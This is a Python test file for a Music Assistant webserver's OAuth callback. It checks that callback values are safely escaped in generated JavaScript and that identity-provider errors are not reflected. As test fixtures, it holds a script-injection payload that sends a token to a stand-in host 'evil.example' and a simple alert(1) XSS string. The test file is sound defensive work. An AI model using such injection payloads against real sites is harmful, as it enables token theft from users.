"""Tests for the webserver OAuth callback."""

from __future__ import annotations

from unittest.mock import AsyncMock, patch
from urllib.parse import quote

import pytest
from aiohttp import web
from aiohttp.test_utils import make_mocked_request
from music_assistant_models.auth import User, UserRole

from music_assistant.controllers.webserver.controller import WebserverController
from music_assistant.controllers.webserver.helpers.auth_providers import AuthResult
from music_assistant.controllers.webserver.helpers.login_flow import AuthTransport
from music_assistant.helpers.json import json_dumps
from music_assistant.helpers.redirect_validation import build_code_redirect_url
from music_assistant.mass import MusicAssistant


async def test_auth_callback_serializes_script_values_safely(
    mass_minimal: MusicAssistant,
) -> None:
    """OAuth callback values cannot break out of their JavaScript string literals."""
    token = "LOCAL_TEST_TOKEN"
    return_url = (
        "https://my.home-assistant.io/'</script><script>"
        "fetch('https://evil.example/steal?t='+token)</script>\"\u2028\u2029"
    )
    webserver = WebserverController(mass_minimal)
    mass_minimal.webserver = webserver
    request = make_mocked_request(
        "GET",
        "/auth/callback?code=fakecode&state=fakestate&provider_id=homeassistant",
        app=web.Application(),
    )

    handle_oauth_callback = AsyncMock(
        return_value=AuthResult(
            success=True,
            user=User(user_id="test", username="test", role=UserRole.USER),
            return_url=return_url,
        )
    )
    with (
        patch.object(webserver.auth, "handle_oauth_callback", new=handle_oauth_callback),
        patch.object(webserver.auth, "create_token", new=AsyncMock(return_value=token)),
    ):
        response = await webserver._handle_auth_callback(request)

    handle_oauth_callback.assert_awaited_once_with("homeassistant", "fakecode", "fakestate")

    redirect_url = build_code_redirect_url(return_url, token)
    safe_redirect_url = (
        json_dumps(redirect_url)
        .replace("&", "\\u0026")
        .replace("<", "\\u003c")
        .replace(">", "\\u003e")
        .replace("\u2028", "\\u2028")
        .replace("\u2029", "\\u2029")
    )
    assert response.status == 200
    assert response.text is not None
    assert f"const redirectUrl = {safe_redirect_url};" in response.text
    assert f"const token = {json_dumps(token)};" in response.text


@pytest.mark.parametrize("known_state", [True, False])
async def test_auth_callback_idp_error_consumes_state(
    mass_minimal: MusicAssistant, known_state: bool
) -> None:
    """An error from the identity provider ends the sign-in without exchanging a code."""
    webserver = WebserverController(mass_minimal)
    mass_minimal.webserver = webserver
    pending = webserver.auth.pending_logins.start(
        "homeassistant",
        AuthTransport.DIRECT,
        "http://localhost:8095/auth/callback?provider_id=homeassistant",
        "verifier",
        return_url="http://localhost:8095/",
    )
    state = pending.state if known_state else "unknown-state"
    error = quote("<script>alert(1)</script>", safe="")
    request = make_mocked_request(
        "GET",
        f"/auth/callback?error={error}&error_description={error}&code=fakecode"
        f"&state={state}&provider_id=homeassistant",
        app=web.Application(),
    )

    handle_oauth_callback = AsyncMock()
    create_token = AsyncMock(return_value="LOCAL_TEST_TOKEN")
    with (
        patch.object(webserver.auth, "handle_oauth_callback", new=handle_oauth_callback),
        patch.object(webserver.auth, "create_token", new=create_token),
    ):
        response = await webserver._handle_auth_callback(request)

    handle_oauth_callback.assert_not_awaited()
    create_token.assert_not_awaited()
    assert response.status == 400
    assert response.text is not None
    assert "<script>" not in response.text
    assert "localhost:8095" not in response.text
    # only the sign-in named by the state is consumed
    assert (webserver.auth.pending_logins.pop(pending.state) is None) is known_state


async def test_auth_callback_idp_error_without_state(mass_minimal: MusicAssistant) -> None:
    """An error without a state is answered with the error page."""
    webserver = WebserverController(mass_minimal)
    mass_minimal.webserver = webserver
    request = make_mocked_request(
        "GET", "/auth/callback?error=access_denied", app=web.Application()
    )
    response = await webserver._handle_auth_callback(request)
    assert response.status == 400
    assert response.text is not None
    assert "Authentication Failed" in response.text
    assert "access_denied" not in response.text
